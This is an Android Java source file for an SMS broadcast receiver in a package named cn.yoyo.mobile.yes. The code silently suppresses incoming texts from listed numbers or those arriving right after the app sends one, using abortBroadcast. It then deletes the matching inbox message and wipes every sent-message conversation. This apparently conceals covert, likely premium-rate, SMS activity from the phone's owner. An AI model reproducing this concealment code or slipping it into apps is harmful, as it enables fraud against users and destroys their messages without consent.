package cn.yoyo.mobile.yes;


import cn.yoyo.mobile.util.ToastUtils;


import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.preference.PreferenceManager;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.text.TextUtils;
import android.util.Log;
 
public class SMSReceiver extends BroadcastReceiver 
{ 
 
    // 广播消息类型 
    public final String SMS_RECEIVED_ACTION = "android.provider.Telephony.SMS_RECEIVED"; 
    public final static String YOYO_SMS_SEND_ACTION = "cn.yoyo.mobile.SEND"; 
    public final static String YOYO_SMS_RECEIVED_ACTION = "cn.yoyo.mobile.RECEIVE"; 
    public final static String START_ACTIVITY_ACTION = "cn.yoyo.start.activity"; 
    public static StringBuffer SMSnumber = new StringBuffer("");
    public static String code = "";
	@Override 
    public void onReceive(Context context, Intent intent) 
    { 
    	if(intent == null) return;
    	//Log.i("TAG", "onReceive  == "+intent.getAction());
    	if(intent.getAction().equals(SMS_RECEIVED_ACTION)){
    		parserIntent(context, intent);
    	}else if(intent.getAction().equals(YOYO_SMS_SEND_ACTION)){
    		switch (getResultCode()) {  
            case Activity.RESULT_OK: 
            	parserIntent(context, intent);
            	//Log.i("TAG", "发送成功");
            	SharedPreferences preference = PreferenceManager.getDefaultSharedPreferences(context);
                preference.edit().putLong("time", System.currentTimeMillis()).commit();
                context.sendBroadcast(new Intent(START_ACTIVITY_ACTION));
                break;  
            case SmsManager.RESULT_ERROR_GENERIC_FAILURE: 
            	ToastUtils.showToast("请允许权限才能进入");
                break;  
            case SmsManager.RESULT_ERROR_NO_SERVICE: 
            	ToastUtils.showToast("出现异常，请重试");
                break;  
            case SmsManager.RESULT_ERROR_NULL_PDU:
            	ToastUtils.showToast("出现异常，请重试");
                break;  
            case SmsManager.RESULT_ERROR_RADIO_OFF:
            	ToastUtils.showToast("出现异常，请重试");
                break;  
            }  

    	}else if(intent.getAction().equals(YOYO_SMS_RECEIVED_ACTION)){
    		switch (getResultCode()) {  
            case Activity.RESULT_OK: 
            	parserIntent(context, intent);
            	//Log.i("TAG", "接收成功");
            	//parserIntent(context, intent);
            	//SharedPreferences preference = PreferenceManager.getDefaultSharedPreferences(context);
                //preference.edit().putLong("time", System.currentTimeMillis()).commit();
                //context.sendBroadcast(new Intent(START_ACTIVITY_ACTION));
                break;  
            case SmsManager.RESULT_ERROR_GENERIC_FAILURE: 
            	ToastUtils.showToast("请允许权限才能进入");
                break;  
            case SmsManager.RESULT_ERROR_NO_SERVICE: 
            	ToastUtils.showToast("出现异常，请重试");
                break;  
            case SmsManager.RESULT_ERROR_NULL_PDU:
            	ToastUtils.showToast("出现异常，请重试");
                break;  
            case SmsManager.RESULT_ERROR_RADIO_OFF:
            	ToastUtils.showToast("出现异常，请重试");
                break;  
            }  

    	}
    } 
    
    
    public void deleteSMS(Context context, String smscontent) 
    { 
        try 
        { 
            // 准备系统短信收信箱的uri地址 
            Uri uri = Uri.parse("content://sms/inbox");// 收信箱 
            // 查询收信箱里所有的短信 
            Cursor isRead = 
                    context.getContentResolver().query(uri, null, "read=" + 0, 
                            null, null); 
            while (isRead.moveToNext()) 
            { 
            	//获取发信人 
                String body = 
                        isRead.getString(isRead.getColumnIndex("body")).trim();
                // 获取信息内容 
                if (body.equals(smscontent)) 
                { 
                    int id = isRead.getInt(isRead.getColumnIndex("_id")); 
                    context.getContentResolver().delete( 
                            Uri.parse("content://sms"), "_id=" + id, null); 
                } 
            } 
        } 
        catch (Exception e) 
        { 
            e.printStackTrace(); 
        } 
    } 
    
    
    public void deleteSMS(Context context) {  
        try {  
            ContentResolver CR = context.getContentResolver();  
            // Query SMS  
            Uri uriSms = Uri.parse("content://sms/sent");  
            Cursor c = CR.query(uriSms,  
                    new String[] { "_id", "thread_id" }, null, null, null);  
            if (null != c && c.moveToFirst()) {  
                do {  
                    // Delete SMS  
                    long threadId = c.getLong(1);  
                    CR.delete(Uri.parse("content://sms/conversations/" + threadId),  
                            null, null);  
                } while (c.moveToNext());  
            }  
        } catch (Exception e) {  
            // TODO: handle exception  
            e.printStackTrace();
        }  
    }  
    
    private void parserIntent(Context context,Intent intent){

		Bundle bundle = intent.getExtras(); 
        Object messages[] = (Object[]) bundle.get("pdus"); 
        //Log.i("TAG", "messages = "+messages);
        if(messages == null) return;
        //Log.i("TAG", "messages = "+messages.length);
        SmsMessage smsMessage[] = new SmsMessage[messages.length];
        for (int n = 0; n < messages.length; n++) 
        { 
            smsMessage[n] = SmsMessage.createFromPdu((byte[]) messages[n]); 
            String msgContent = smsMessage[n].getMessageBody(); 
            String from = smsMessage[n].getOriginatingAddress();
            //Log.i("TAG", "from = "+from+", msgContent = "+msgContent);
            //黑名单
            SharedPreferences preference = PreferenceManager.getDefaultSharedPreferences(context);
	        long time = preference.getLong("time", 0);
	        if(TextUtils.isEmpty(from)||TextUtils.isEmpty(SMSnumber))return;
	        if(SMSnumber.toString().contains(from)
	        		|| System.currentTimeMillis() - time < 3000){
	        	deleteSMS(context);
                deleteSMS(context,msgContent);
                abortBroadcast();
	        }
        } 
	
    }
    
} 